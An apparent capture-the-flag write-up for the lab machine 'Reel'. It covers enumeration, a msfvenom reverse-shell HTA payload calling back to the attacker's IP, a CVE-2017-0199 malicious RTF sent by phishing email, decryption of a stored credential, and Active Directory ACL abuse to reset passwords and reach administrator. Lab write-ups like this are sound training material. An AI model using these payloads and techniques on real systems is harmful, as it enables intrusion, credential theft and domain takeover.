# Reel
>Author : Xyan1d3
>Date : 19th July 2021
>IP : 10.10.10.77
>OS : Windows Active Directory
>Difficulty : Hard
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sun Jul 18 21:59:15 2021 as: nmap -sC -sV -v -oN nmap/reel 10.10.10.77
Nmap scan report for 10.10.10.77
Host is up (0.073s latency).
Not shown: 992 filtered ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC

Host script results:
|_clock-skew: mean: -19m51s, deviation: 34m35s, median: 6s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2021-07-18T17:32:20+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-18T16:32:19
|_  start_date: 2021-07-18T16:28:57
```

## Crackmapexec
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/reel]
└──╼ # crackmapexec smb 10.10.10.77
SMB         10.10.10.77     445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True)
```

## FTP Enumeration
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/reel/ftp]                         
└──╼ # ftp 10.10.10.77      
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:root): anonymous      
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:                                                                           
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -a
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls -a
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
```

We do an `exiftool` on all the files and find out that we have an email address.
![[Pasted image 20210718231932.png]]

# Initial FootHold
We generate an `hta` payload with metasploit.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/reel/www]
└──╼ # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.22 LPORT=8888 -f hta-psh -o love.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6603 bytes
Saved as: love.hta
```

We now use a tool from github to generate an malicious rtf file.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/reel]
└──╼ # python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -u http://10.10.14.22/love.hta -w love_letter.rtf -t rtf 
Generating normal RTF payload.

Generated love_letter.rtf successfully
```

We send a mail to `nico@megabank.com` from any mail address attaching the malicious rtf file and we get a shell on the box.
![[Pasted image 20210718234900.png]]

## Getting the user Flag
```python
C:\Users\nico\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\nico\Desktop

28/05/2018  21:07    <DIR>          .
28/05/2018  21:07    <DIR>          ..
28/10/2017  00:59             1,468 cred.xml
28/10/2017  00:40                32 user.txt
               2 File(s)          1,500 bytes
               2 Dir(s)  15,769,944,064 bytes free

C:\Users\nico\Desktop>type user.txt
type user.txt
fa363aebcfa2c29897a69af385fee971
```

We see an `cred.xml` which is a powershell `PSCredential`.
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

```python
C:\Users\nico\Desktop>powershell.exe "$cred = Import-CliXml -Path cred.xml ; $cred.GetNetworkCredential()"
powershell.exe "$cred = Import-CliXml -Path cred.xml ; $cred.GetNetworkCredential()"

UserName                                           Domain
--------                                           ------
Tom                                                HTB

C:\Users\nico\Desktop>powershell.exe "$cred = Import-CliXml -Path cred.xml ; $cred.GetNetworkCredential().Password"
powershell.exe "$cred = Import-CliXml -Path cred.xml ; $cred.GetNetworkCredential().Password"
1ts-mag1c!!!

```

We get a credential `Tom` : `1ts-mag1c!!!`

# User Escalation to Tom
We use those credentials to `SSH` into the `Tom` user.
![[Pasted image 20210719181435.png]]

We now run `Sharphound.ps1` to feed some food to our `bloodhound`.
On, Analyzing we find out that we have `writeowner` permission or ACL on `claire`.
![[Pasted image 20210719182935.png]]

We could use `powerview` to grant ourselves the `ACL` rights and access the reset password privilege.
```powershell
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity Tom                          
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity Tom -Rights DCSync   
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity Tom -Rights ResetPassword
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $pass = ConvertTo-SecureString "Dev1ce@_@123" -AsPlainText -Force                  
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $pass
```

# User Escalation to Claire
We could now use our password to `SSH` into `claire`.
![[Pasted image 20210719224615.png]]

We see that the user has `WriteDACL` and `GenericWrite` on the `Backup_Admins` group.
![[Pasted image 20210719225618.png]]

We could add ourselves into the `Backup_Admins` groups.
```python
claire@REEL C:\Users\claire>net group "Backup_Admins" claire /add /domain
The command completed successfully.
```
We add ourselves to the `Backup_Admins` group.
After, Adding ourselves to the `Backup_Admins` group we have to re `SSH` into the box as it does not enables the privilege.

We see that we can now get inside the `Administrator/Desktop` directory.
```python
claire@REEL C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\Administrator\Desktop

01/21/2018  03:56 PM    <DIR>          .
01/21/2018  03:56 PM    <DIR>          ..
11/02/2017  10:47 PM    <DIR>          Backup Scripts
10/28/2017  12:56 PM                32 root.txt
               1 File(s)             32 bytes
               3 Dir(s)  15,772,975,104 bytes free

claire@REEL C:\Users\Administrator\Desktop>type root.txt
Access is denied.
```

We see that we have access to the `Backup Scripts` directory which contains a lot of `ps1` files. Of Which, The `BackupScript.ps1` contains an admin password.
![[Pasted image 20210719232630.png]]

We use the credentials to `SSH` into the `Administrator` user.
![[Pasted image 20210719232848.png]]

## Getting the Root Flag
```python
administrator@REEL C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\Administrator\Desktop

21/01/2018  15:56    <DIR>          .
21/01/2018  15:56    <DIR>          ..
02/11/2017  22:47    <DIR>          Backup Scripts
28/10/2017  12:56                32 root.txt
               1 File(s)             32 bytes
               3 Dir(s)  15,772,946,432 bytes free

administrator@REEL C:\Users\Administrator\Desktop>type root.txt
1018a0331e686176ff4577c728eaf32a
```
# Credentials
|Username|Password|
|--|--|
|Tom|`1ts-mag1c!!!`|
|Administrator|`Cr4ckMeIfYouC4n!`|